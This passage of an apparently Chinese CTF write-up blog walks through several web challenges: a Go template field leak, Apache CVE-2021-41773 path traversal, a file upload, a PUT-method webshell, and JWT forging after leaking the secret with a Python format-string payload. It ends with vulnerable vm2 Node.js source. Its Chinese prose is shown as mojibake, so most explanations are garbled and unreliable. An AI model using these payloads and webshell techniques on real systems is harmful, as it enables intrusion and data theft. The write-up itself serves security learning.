<p>ç„¶åæœ‰ä¸€ä¸ªæ¨¡æ¿æ¸²æŸ“</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tmpl, err := template.New(<span class="string">&quot;admin_index&quot;</span>).Parse(html)</span><br></pre></td></tr></table></figure>

<p>goè¯­è¨€æ¨¡æ¿æ¸²æŸ“æ”¯æŒä¼ å…¥ä¸€ä¸ªç»“æ„ä½“çš„å®ä¾‹æ¥æ¸²æŸ“å®ƒçš„å­—æ®µï¼Œå°±æœ‰å¯èƒ½é€ æˆä¿¡æ¯æ³„éœ²</p>
<p><img src="https://gitee.com/zxydsg/yiyi_blog/raw/master/image-20240721175528022.png" alt="image-20240721175528022"></p>
<p>è€Œåœ¨goè¯­è¨€ä¸­ä½¿ç”¨çš„æ˜¯<code>&#123;&#123;.name&#125;&#125;</code>ä»£è¡¨è¦åº”ç”¨çš„å¯¹è±¡ï¼Œæ‰€ä»¥å¯ä»¥è®©<code>age=&#123;&#123;.Password&#125;&#125;</code></p>
<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/6b35925d892f47c78dded0b40cbc6908.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<p>è¯å®æ¨æ–­</p>
<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240721175641016.png" alt="image-20240721175641016"></p>
<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240721175700694.png" alt="image-20240721175700694"></p>
<h2 id="NSSRound-4-SWPU-ez-rce"><a href="#NSSRound-4-SWPU-ez-rce" class="headerlink" title="[NSSRound#4 SWPU]ez_rce"></a>[NSSRound#4 SWPU]ez_rce</h2><p>å•¥ä¹Ÿæ²¡æœ‰ï¼ŒæŠ“åŒ…åå‘ç°apacheç‰ˆæœ¬ä¸º2.4.49 (Unix)</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_45260839/article/details/125113167">CVE-2021-41773(42013) Apache HTTP Serverè·¯å¾„ç©¿è¶Šæ¼æ´å¤ç°_cve-2021-41773å¤ç°-CSDNåšå®¢</a></p>
<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240721180247059.png" alt="image-20240721180247059"></p>
<p>åŒæ—¶dirsearchä¹Ÿæœ‰æç¤º</p>
<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240721181126194.png" alt="image-20240721181126194"></p>
<p>æŠ“åŒ…ä¿®æ”¹</p>
<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240721181417264.png" alt="image-20240721181417264"></p>
<p>ç›´æ¥è®¿é—®çœ‹ä¸äº†ï¼Œæœ€ååœ¨run.shä¸­çœ‹åˆ°flagçš„çœŸå®ä½ç½®</p>
<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240721181459887.png" alt="image-20240721181459887"></p>
<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240721181546704.png" alt="image-20240721181546704"></p>
<h2 id="WUSTCTF-2020-CV-Maker"><a href="#WUSTCTF-2020-CV-Maker" class="headerlink" title="[WUSTCTF 2020]CV Maker"></a>[WUSTCTF 2020]CV Maker</h2><p>éšæ„æ³¨å†Œä¸€ä¸ªè´¦å·ç™»å½•</p>
<p><img src="https://gitee.com/zxydsg/yiyi_blog/raw/master/image-20240721182147295.png" alt="image-20240721182144867"></p>
<p>æ–‡ä»¶ä¸Šä¼ </p>
<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240721183527789.png" alt="image-20240721183527789"></p>
<p><img src="https://gitee.com/zxydsg/yiyi_blog/raw/master/image-20240721183044880.png" alt="image-20240721183044880"></p>
<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240721183555041.png" alt="image-20240721183555041"></p>
<p>flagåœ¨ç¯å¢ƒå˜é‡ä¸­</p>
<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240721183655428.png" alt="image-20240721183655428"></p>
<h2 id="NSSRound-1-Basic-basic-check"><a href="#NSSRound-1-Basic-basic-check" class="headerlink" title="[NSSRound#1 Basic]basic_check"></a>[NSSRound#1 Basic]basic_check</h2><p>PUTæ–¹æ³•åˆ›å»ºæœ¨é©¬</p>
<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240721184733912.png" alt="image-20240721184733912"></p>
<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240721184920543.png" alt="image-20240721184920543"></p>
<h2 id="MoeCTF-2021-åœ°ç‹±é€šè®¯-æ”¹"><a href="#MoeCTF-2021-åœ°ç‹±é€šè®¯-æ”¹" class="headerlink" title="[MoeCTF 2021]åœ°ç‹±é€šè®¯-æ”¹"></a>[MoeCTF 2021]åœ°ç‹±é€šè®¯-æ”¹</h2><p>ç›´æ¥ç»™æºç </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template, request, session, redirect, make_response</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> secret, headers, User</span><br><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;app.py&quot;</span>, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        ctx = f.read()</span><br><span class="line">    res = make_response(ctx)</span><br><span class="line">    name = request.args.get(<span class="string">&#x27;name&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;admin&#x27;</span> <span class="keyword">in</span> name <span class="keyword">or</span> name == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line">    payload = &#123;</span><br><span class="line">        <span class="string">&quot;name&quot;</span>: name,</span><br><span class="line">    &#125;</span><br><span class="line">    token = jwt.encode(payload, secret, algorithm=<span class="string">&#x27;HS256&#x27;</span>, headers=headers)</span><br><span class="line">    res.set_cookie(<span class="string">&#x27;token&#x27;</span>, token)</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/hello&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello</span>():</span><br><span class="line">    token = request.cookies.get(<span class="string">&#x27;token&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> token:</span><br><span class="line">        <span class="keyword">return</span> redirect(<span class="string">&#x27;/&#x27;</span>, <span class="number">302</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        name = jwt.decode(token, secret, algorithms=[<span class="string">&#x27;HS256&#x27;</span>])[<span class="string">&#x27;name&#x27;</span>]</span><br><span class="line">    <span class="keyword">except</span> jwt.exceptions.InvalidSignatureError <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Invalid token&quot;</span></span><br><span class="line">    <span class="keyword">if</span> name != <span class="string">&quot;admin&quot;</span>:</span><br><span class="line">        user = User(name)</span><br><span class="line">        flag = request.args.get(<span class="string">&#x27;flag&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        message = <span class="string">&quot;Hello &#123;0&#125;, your flag is &#123;1&#125;&quot;</span>.<span class="built_in">format</span>(user, flag)</span><br><span class="line">        <span class="keyword">return</span> message</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;flag.html&#x27;</span>, name=name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure>

<p>å¤§è‡´çœ‹ä¸€çœ¼ï¼Œåˆšå­¦çš„jwtä¼ªé€ </p>
<ol>
<li><code>index</code> è·¯ç”±ï¼šè¿™ä¸ªè·¯ç”±å¤„ç†æ ¹è·¯å¾„ â€œ&#x2F;â€ çš„è¯·æ±‚ï¼Œæ”¯æŒ GET å’Œ POST æ–¹æ³•ã€‚é¦–å…ˆï¼Œå®ƒè¯»å–æ–‡ä»¶ â€œapp.pyâ€ çš„å†…å®¹å¹¶å°†å…¶ä½œä¸ºå“åº”è¿”å›ã€‚ç„¶åï¼Œä»è¯·æ±‚å‚æ•°ä¸­è·å–åä¸º â€œnameâ€ çš„å€¼ï¼Œå¦‚æœè¯¥å€¼åŒ…å« â€œadminâ€ æˆ–è€…ä¸ºç©ºå­—ç¬¦ä¸²ï¼Œå°†è¿”å›ä¹‹å‰è¯»å–çš„ â€œapp.pyâ€ å†…å®¹ä½œä¸ºå“åº”ã€‚å¦åˆ™ï¼Œå°†ä½¿ç”¨æä¾›çš„ â€œnameâ€ æ„é€ ä¸€ä¸ª JWT è½½è·ï¼ˆpayloadï¼‰ï¼Œç„¶åä½¿ç”¨æŒ‡å®šçš„å¯†é’¥ <code>secret</code> å’Œå¤´éƒ¨ <code>headers</code> ç”Ÿæˆ JWTï¼Œå°†ç”Ÿæˆçš„ JWT æ”¾å…¥ cookie ä¸­ï¼Œæœ€åå°† â€œapp.pyâ€ å†…å®¹ä½œä¸ºå“åº”è¿”å›ã€‚</li>
<li><code>hello</code> è·¯ç”±ï¼šè¿™ä¸ªè·¯ç”±å¤„ç† â€œ&#x2F;helloâ€ è·¯å¾„çš„è¯·æ±‚ï¼ŒåŒæ ·æ”¯æŒ GET å’Œ POST æ–¹æ³•ã€‚é¦–å…ˆï¼Œå®ƒå°è¯•ä»è¯·æ±‚çš„ cookie ä¸­è·å–åä¸º â€œtokenâ€ çš„ JWTã€‚å¦‚æœæ²¡æœ‰æ‰¾åˆ° tokenï¼Œå°†é‡å®šå‘åˆ°æ ¹è·¯å¾„ â€œ&#x2F;â€. å¦‚æœæ‰¾åˆ° tokenï¼Œåˆ™å°è¯•è§£ç  JWT å¹¶ä»ä¸­æå– â€œnameâ€ å­—æ®µçš„å€¼ã€‚å¦‚æœ JWT éªŒè¯å¤±è´¥ï¼ˆå¯èƒ½æ˜¯å› ä¸ºç­¾åä¸åŒ¹é…ï¼‰ï¼Œè¿”å› â€œInvalid tokenâ€ã€‚</li>
<li>å¦‚æœ â€œnameâ€ å­—æ®µä¸æ˜¯ â€œadminâ€ï¼Œåˆ™åˆ›å»ºä¸€ä¸ª User å®ä¾‹ï¼Œç„¶åä»è¯·æ±‚å‚æ•°ä¸­è·å–åä¸º â€œflagâ€ çš„å€¼ï¼ˆå¦‚æœå­˜åœ¨ï¼‰ã€‚æ¥ä¸‹æ¥ï¼Œæ ¹æ®ç”¨æˆ·çš„ä¿¡æ¯æ„é€ ä¸€æ¡æ¬¢è¿æ¶ˆæ¯ï¼Œå°† flag å€¼åµŒå…¥æ¶ˆæ¯ä¸­ï¼Œç„¶åå°†è¿™ä¸ªæ¶ˆæ¯ä½œä¸ºå“åº”è¿”å›ã€‚</li>
<li>å¦‚æœ â€œnameâ€ å­—æ®µæ˜¯ â€œadminâ€ï¼Œåˆ™æ¸²æŸ“ä¸€ä¸ªåä¸º â€œflag.htmlâ€ çš„æ¨¡æ¿ï¼Œå¹¶ä¼ é€’ â€œnameâ€ ä½œä¸ºå‚æ•°ã€‚</li>
</ol>
<p>è¿™é‡Œéœ€è¦ä¸¤ä¸ªæ¡ä»¶ï¼Œsecretå’Œheaders</p>
<p>ç”¨sstiæ¼æ´å¸¦å‡ºè¿™ä¸¤ä¸ªæ¡ä»¶</p>
<p>åˆ›å»ºä¸€ä¸ªç”¨æˆ·</p>
<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240721192742870.png" alt="image-20240721192742870"></p>
<p>å¾—åˆ°å¯¹åº”çš„jwtçš„å€¼</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiMTIzIn0.pEkv9ha7ygfhxZay1tBtb48vjBzAW05Rw4-azvvefGA</span><br></pre></td></tr></table></figure>

<p>æ‹‰å‡ºæ¥çœ‹ä¸€ä¸‹å…·ä½“å†…å®¹</p>
<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240721192603326.png" alt="	"></p>
<p>å¸¦ç€tokenå»è®¿é—®</p>
<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240721192942764.png" alt="image-20240721192942764"></p>
<p>å°è¯•ssti</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;0.__class__.__init__.__globals__&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240721193627529.png" alt="image-20240721193627529"></p>
<p>secret: u_have_kn0w_what_f0rmat_i5</p>
<p>headers: {â€˜algâ€™: â€˜HS256â€™, â€˜typâ€™: â€˜JWTâ€™}</p>
<p>éªŒè¯æˆåŠŸ</p>
<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240721193726623.png" alt="image-20240721193726623"></p>
<p>å°†ç”¨æˆ·æ”¹ä¸ºadmin</p>
<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240721193809514.png" alt="image-20240721193809514"></p>
<p>å°†ä¼ªé€ å¥½çš„jwtæ”¾å…¥tokené‡æ–°å‘åŒ…è®¿é—®helloè·¯ç”±å¾—åˆ°flag</p>
<p><img src="https://gitee.com/zxydsg/yiyi_blog/raw/master/image-20240721193908109.png" alt="image-20240721193908109"></p>
<h2 id="HZNUCTF-2023-final-eznode"><a href="#HZNUCTF-2023-final-eznode" class="headerlink" title="[HZNUCTF 2023 final]eznode"></a>[HZNUCTF 2023 final]eznode</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_61768489/article/details/130138439">Nodejs vm&#x2F;vm2æ²™ç®±é€ƒé€¸_nodejs vm2-CSDNåšå®¢</a></p>
<p><a target="_blank" rel="noopener" href="https://xilitter.github.io/2023/01/31/vm%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E5%88%9D%E6%8E%A2/index.html">vmæ²™ç®±é€ƒé€¸åˆæ¢ | XiLitter</a></p>
<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240722085351426.png" alt="image-20240722085351426"></p>
<p>æç¤ºå°è¯•æŸ¥çœ‹æºç ï¼Œæœ€ç›´è§‚çš„å°±æ˜¯<code>node.js</code>é…ç½®é”™è¯¯é€ æˆçš„æºç æ³„éœ²äº†ï¼Œç›´æ¥è®¿é—®<code>app.js</code>è·å¾—é¡µé¢æºç </p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line"><span class="keyword">const</span> &#123; <span class="variable constant_">VM</span> &#125; = <span class="built_in">require</span>(<span class="string">&#x27;vm2&#x27;</span>);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">json</span>());</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> backdoor = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title function_">VM</span>().<span class="title function_">run</span>(&#123;&#125;.<span class="property">shellcode</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(e);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">isObject</span> = obj =&gt; obj &amp;&amp; obj.<span class="property">constructor</span> &amp;&amp; obj.<span class="property">constructor</span> === <span class="title class_">Object</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="title function_">merge</span> = (<span class="params">a, b</span>) =&gt; &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> attr <span class="keyword">in</span> b) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_">isObject</span>(a[attr]) &amp;&amp; <span class="title function_">isObject</span>(b[attr])) &#123;</span><br><span class="line">            <span class="title function_">merge</span>(a[attr], b[attr]);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            a[attr] = b[attr];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> a</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> <span class="title function_">clone</span> = (<span class="params">a</span>) =&gt; &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">merge</span>(&#123;&#125;, a);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>) &#123;</span><br><span class="line">    res.<span class="title function_">send</span>(<span class="string">&quot;POST some json shit to /.  no source code and try to find source code&quot;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(req.<span class="property">body</span>)</span><br><span class="line">        <span class="keyword">var</span> body = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(req.<span class="property">body</span>));</span><br><span class="line">        <span class="keyword">var</span> copybody = <span class="title function_">clone</span>(body)</span><br><span class="line">        <span class="keyword">if</span> (copybody.<span class="property">shit</span>) &#123;</span><br><span class="line">            <span class="title function_">backdoor</span>()</span><br><span class="line">        &#125;</span><br><span class="line">        res.<span class="title function_">send</span>(<span class="string">&quot;post shit ok&quot;</span>)</span><br><span class="line">    &#125;<span class="keyword">catch</span>(e)&#123;</span><br><span class="line">        res.<span class="title function_">send</span>(<span class="string">&quot;is it shit ?&quot;</span>)</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(e)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(<span class="number">3000</span>, <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;start listening on port 3000&#x27;</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>å­¦ä¹ ä¸€ä¸‹ç›¸å…³çŸ¥è¯†</p>
<h3 id="å†…ç½®æ¨¡å—çš„å‡½æ•°"><a href="#å†…ç½®æ¨¡å—çš„å‡½æ•°" class="headerlink" title="å†…ç½®æ¨¡å—çš„å‡½æ•°"></a>å†…ç½®æ¨¡å—çš„å‡½æ•°</h3><ol>
<li><p><strong><code>require()</code></strong></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p><code>require()</code>å‡½æ•°ç”¨äºåŠ è½½Node.jsæ¨¡å—æˆ–æ–‡ä»¶ã€‚ä¾‹å¦‚ï¼Œ<code>require(&#39;express&#39;)</code>åŠ è½½äº†Expressæ¡†æ¶ï¼Œä½¿ä½ èƒ½å¤Ÿä½¿ç”¨å…¶æä¾›çš„åŠŸèƒ½ã€‚</p>
</li>
<li><p><strong><code>console.log()</code></strong></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(req.<span class="property">body</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(e);</span><br></pre></td></tr></table></figure>

<p><code>console.log()</code>æ˜¯Node.jsä¸­ç”¨äºåœ¨æ§åˆ¶å°è¾“å‡ºä¿¡æ¯çš„å‡½æ•°ï¼Œå®ƒé€šå¸¸ç”¨äºè°ƒè¯•ç›®çš„ã€‚</p>
</li>
<li><p><strong><code>JSON.parse()</code> å’Œ <code>JSON.stringify()</code></strong></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> body = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(req.<span class="property">body</span>));</span><br></pre></td></tr></table></figure>

<p><code>JSON.parse()</code>ç”¨äºå°†JSONæ ¼å¼çš„å­—ç¬¦ä¸²è½¬æ¢æˆJavaScriptå¯¹è±¡ï¼Œè€Œ<code>JSON.stringify()</code>åˆ™å°†JavaScriptå¯¹è±¡è½¬æ¢æˆJSONå­—ç¬¦ä¸²ã€‚åœ¨ä¸Šé¢çš„ä¾‹å­ä¸­ï¼Œ<code>JSON.stringify(req.body)</code>å°†è¯·æ±‚ä½“è½¬æ¢æˆå­—ç¬¦ä¸²ï¼Œç„¶å<code>JSON.parse()</code>åˆå°†å…¶è½¬æ¢å›å¯¹è±¡ï¼Œä½†è¿™å®é™…ä¸Šæ˜¯ä¸å¿…è¦çš„ï¼Œå› ä¸º<code>req.body</code>å·²ç»æ˜¯ä¸€ä¸ªå¯¹è±¡ã€‚</p>
</li>
<li><p><strong><code>app.listen()</code></strong></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">app.<span class="title function_">listen</span>(<span class="number">3000</span>, <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;start listening on port 3000&#x27;</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p><code>app.listen()</code>æ˜¯Expressæ¡†æ¶ä¸­çš„æ–¹æ³•ï¼Œç”¨äºå¯åŠ¨HTTPæœåŠ¡å™¨å¹¶ç›‘å¬ç‰¹å®šçš„ç«¯å£ã€‚åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼ŒæœåŠ¡å™¨å°†åœ¨3000ç«¯å£ä¸Šç›‘å¬ã€‚</p>
</li>
</ol>
<h3 id="Expressæ¡†æ¶ç›¸å…³çš„å‡½æ•°"><a href="#Expressæ¡†æ¶ç›¸å…³çš„å‡½æ•°" class="headerlink" title="Expressæ¡†æ¶ç›¸å…³çš„å‡½æ•°"></a>Expressæ¡†æ¶ç›¸å…³çš„å‡½æ•°</h3><ol>
<li><p><strong><code>app.use()</code></strong></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">json</span>());</span><br></pre></td></tr></table></figure>

<p><code>app.use()</code>æ˜¯Expressçš„ä¸­é—´ä»¶æ³¨å†Œå‡½æ•°ã€‚åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œå®ƒæ³¨å†Œäº†ä¸€ä¸ªJSONè§£æä¸­é—´ä»¶ï¼Œä½¿å¾—æœåŠ¡å™¨èƒ½å¤Ÿè§£æJSONæ ¼å¼çš„POSTè¯·æ±‚ä½“ã€‚</p>
</li>
<li><p><strong><code>app.get()</code> å’Œ <code>app.post()</code></strong></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>) &#123;&#125;);</span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>) &#123;&#125;);</span><br></pre></td></tr></table></figure>

<p>è¿™äº›æ–¹æ³•ç”¨äºå®šä¹‰è·¯ç”±å¤„ç†å‡½æ•°ã€‚<code>app.get()</code>å®šä¹‰äº†å¤„ç†GETè¯·æ±‚çš„è·¯ç”±ï¼Œ<code>app.post()</code>å®šä¹‰äº†å¤„ç†POSTè¯·æ±‚çš„è·¯ç”±ã€‚<code>req</code>å‚æ•°æ˜¯è¯·æ±‚å¯¹è±¡ï¼ŒåŒ…å«äº†å®¢æˆ·ç«¯å‘é€çš„æ‰€æœ‰ä¿¡æ¯ï¼›<code>res</code>å‚æ•°æ˜¯å“åº”å¯¹è±¡ï¼Œç”¨äºå‘å®¢æˆ·ç«¯å‘é€æ•°æ®ã€‚</p>
</li>
</ol>
<h3 id="è‡ªå®šä¹‰å‡½æ•°"><a href="#è‡ªå®šä¹‰å‡½æ•°" class="headerlink" title="è‡ªå®šä¹‰å‡½æ•°"></a>è‡ªå®šä¹‰å‡½æ•°</h3><ol>
<li><p><strong><code>backdoor()</code></strong></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> backdoor = <span class="keyword">function</span> (<span class="params"></span>) &#123;&#125;;</span><br></pre></td></tr></table></figure>

<p>è¿™ä¸ªå‡½æ•°å°è¯•åœ¨ä¸€ä¸ªæ²™ç®±ç¯å¢ƒä¸­è¿è¡Œæ½œåœ¨çš„æ¶æ„ä»£ç ï¼Œè¿™æ˜¯ä¸€ä¸ªéå¸¸å±é™©çš„æ“ä½œï¼Œå› ä¸ºå®ƒå¯èƒ½å…è®¸è¿œç¨‹ä»£ç æ‰§è¡Œã€‚</p>
</li>
<li><p><strong><code>isObject()</code></strong></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">isObject</span> = obj =&gt; obj &amp;&amp; obj.<span class="property">constructor</span> &amp;&amp; obj.<span class="property">constructor</span> === <span class="title class_">Object</span>;</span><br></pre></td></tr></table></figure>

<p>è¿™ä¸ªå‡½æ•°ç”¨äºæ£€æŸ¥ä¸€ä¸ªå˜é‡æ˜¯å¦æ˜¯æ™®é€šçš„JavaScriptå¯¹è±¡ã€‚</p>
</li>
<li><p><strong><code>merge()</code></strong></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">merge</span> = (<span class="params">a, b</span>) =&gt; &#123;&#125;;</span><br></pre></td></tr></table></figure>

